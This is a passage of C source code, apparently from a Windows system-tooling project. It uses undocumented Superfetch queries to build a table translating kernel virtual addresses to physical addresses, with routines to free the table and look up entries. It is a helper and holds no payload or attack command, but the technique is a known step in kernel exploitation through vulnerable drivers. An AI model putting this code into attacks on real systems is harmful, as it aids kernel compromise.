    if (ntStatus == STATUS_BUFFER_TOO_SMALL && bufferLength > 0) {

        buffer = supHeapAlloc(bufferLength);
        if (buffer == NULL)
            return FALSE;

        RtlSecureZeroMemory(buffer, bufferLength);
        ((PPF_MEMORY_RANGE_INFO_V1)buffer)->Version = 1;

        ntStatus = supQuerySuperfetchInformation(
            SuperfetchMemoryRangesQuery,
            buffer,
            bufferLength,
            NULL);

        if (NT_SUCCESS(ntStatus)) {
            *RangeBuffer = buffer;
            *RangeCount = ((PPF_MEMORY_RANGE_INFO_V1)buffer)->RangeCount;
            return TRUE;
        }

        supHeapFree(buffer);
    }

    return FALSE;
}

/*
* supBuildSuperfetchMemoryMap
*
* Purpose:
*
* Build virtual-to-physical translation table using Superfetch.
*
*/
BOOL supBuildSuperfetchMemoryMap(
    _Out_ PSUPERFETCH_MEMORY_MAP MemoryMap)
{
    NTSTATUS ntStatus;
    ULONG ntBuildNumber;
    ULONG rangeCount = 0;
    ULONG i;
    SIZE_T j;
    ULONG_PTR basePfn, pageCount;
    ULONG pfnBufferSize;
    ULONG_PTR totalPages = 0;
    ULONG_PTR currentEntry = 0;
    BOOL useV2;
    PVOID rangeBuffer = NULL;
    PPF_PFN_PRIO_REQUEST pfnRequest = NULL;
    PSUPERFETCH_TRANSLATION_ENTRY translationTable = NULL;

    RtlSecureZeroMemory(MemoryMap, sizeof(SUPERFETCH_MEMORY_MAP));

    if (!supQuerySuperfetchMemoryRanges(&rangeBuffer, &rangeCount))
        return FALSE;

    ntBuildNumber = NtCurrentPeb()->OSBuildNumber;
    useV2 = (ntBuildNumber >= NT_WIN10_REDSTONE5);

    //
    // Calculate total pages
    //
    for (i = 0; i < rangeCount; i++) {
        if (useV2) {
            pageCount = ((PPF_MEMORY_RANGE_INFO_V2)rangeBuffer)->Ranges[i].PageCount;
        }
        else {
            pageCount = ((PPF_MEMORY_RANGE_INFO_V1)rangeBuffer)->Ranges[i].PageCount;
        }
        totalPages += pageCount;
    }

    if (totalPages == 0) {
        supHeapFree(rangeBuffer);
        return FALSE;
    }

    translationTable = (PSUPERFETCH_TRANSLATION_ENTRY)supHeapAlloc(
        totalPages * sizeof(SUPERFETCH_TRANSLATION_ENTRY));

    if (translationTable == NULL) {
        supHeapFree(rangeBuffer);
        return FALSE;
    }

    //
    // Query PFN information for each range
    //
    for (i = 0; i < rangeCount; i++) {

        if (useV2) {
            basePfn = ((PPF_MEMORY_RANGE_INFO_V2)rangeBuffer)->Ranges[i].BasePfn;
            pageCount = ((PPF_MEMORY_RANGE_INFO_V2)rangeBuffer)->Ranges[i].PageCount;
        }
        else {
            basePfn = ((PPF_MEMORY_RANGE_INFO_V1)rangeBuffer)->Ranges[i].BasePfn;
            pageCount = ((PPF_MEMORY_RANGE_INFO_V1)rangeBuffer)->Ranges[i].PageCount;
        }

        pfnBufferSize = (ULONG)(FIELD_OFFSET(PF_PFN_PRIO_REQUEST, PageData) +
            (pageCount * sizeof(MMPFN_IDENTITY)));

        pfnRequest = (PPF_PFN_PRIO_REQUEST)supHeapAlloc(pfnBufferSize);
        if (pfnRequest == NULL)
            continue;

        RtlSecureZeroMemory(pfnRequest, pfnBufferSize);
        pfnRequest->Version = 1;
        pfnRequest->RequestFlags = 1;
        pfnRequest->PfnCount = pageCount;

        for (j = 0; j < pageCount; j++) {
            pfnRequest->PageData[j].PageFrameIndex = basePfn + j;
        }

        ntStatus = supQuerySuperfetchInformation(
            SuperfetchPfnQuery,
            pfnRequest,
            pfnBufferSize,
            NULL);

        if (NT_SUCCESS(ntStatus)) {

            for (j = 0; j < pageCount; j++) {

                ULONG_PTR virtAddr = (ULONG_PTR)pfnRequest->PageData[j].u2.VirtualAddress;

                if (virtAddr != 0 && (virtAddr & 0xFFFF800000000000ULL)) {
                    translationTable[currentEntry].VirtualAddress = virtAddr & ~(PAGE_SIZE - 1);
                    translationTable[currentEntry].PhysicalAddress = (basePfn + j) << PAGE_SHIFT;
                    currentEntry++;
                }
            }
        }

        supHeapFree(pfnRequest);
    }

    supHeapFree(rangeBuffer);

    if (currentEntry > 0) {
        MemoryMap->TranslationTable = translationTable;
        MemoryMap->TableSize = currentEntry;
        MemoryMap->RangeCount = rangeCount;
        return TRUE;
    }

    supHeapFree(translationTable);
    return FALSE;
}

/*
* supFreeSuperfetchMemoryMap
*
* Purpose:
*
* Free Superfetch memory map resources.
*
*/
VOID supFreeSuperfetchMemoryMap(
    _In_ PSUPERFETCH_MEMORY_MAP MemoryMap)
{
    if (MemoryMap->TranslationTable) {
        supHeapFree(MemoryMap->TranslationTable);
        MemoryMap->TranslationTable = NULL;
    }
    MemoryMap->TableSize = 0;
    MemoryMap->RangeCount = 0;
}

/*
* supSuperfetchVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to physical using pre-built memory map.
*
*/
BOOL supSuperfetchVirtualToPhysical(
    _In_ PSUPERFETCH_MEMORY_MAP MemoryMap,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ PULONG_PTR PhysicalAddress)
{
    ULONG_PTR i;
    ULONG_PTR alignedVA;
    ULONG_PTR pageOffset;
    PSUPERFETCH_TRANSLATION_ENTRY table;

    *PhysicalAddress = 0;

    if (MemoryMap == NULL || MemoryMap->TranslationTable == NULL)
        return FALSE;

    alignedVA = VirtualAddress & ~(PAGE_SIZE - 1);
    pageOffset = VirtualAddress & (PAGE_SIZE - 1);
    table = MemoryMap->TranslationTable;

    for (i = 0; i < MemoryMap->TableSize; i++) {
        if (table[i].VirtualAddress == alignedVA) {
            *PhysicalAddress = table[i].PhysicalAddress + pageOffset;
            return TRUE;
        }
    }

    return FALSE;
}
